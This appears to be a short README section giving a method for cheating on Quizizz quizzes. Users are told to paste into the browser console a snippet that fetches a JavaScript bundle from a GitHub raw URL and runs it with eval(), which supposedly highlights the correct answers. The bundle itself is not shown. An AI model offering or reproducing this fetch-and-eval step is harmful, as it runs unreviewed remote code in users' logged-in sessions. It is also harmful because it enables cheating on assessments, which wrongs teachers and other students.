
# Methods
## Fetching Quizizz API

It should work in Test and Classic mode.
1. Join Quiz
2. Open console and paste this
```ts
fetch("https://raw.githubusercontent.com/acimovicuwu/nijeNistaSumnjivo/master/dist/bundle.js")
.then((res) => res.text()
.then((t) => eval(t)))
```
3. You can now close the console. The good answers should be highlighted by background opacity.
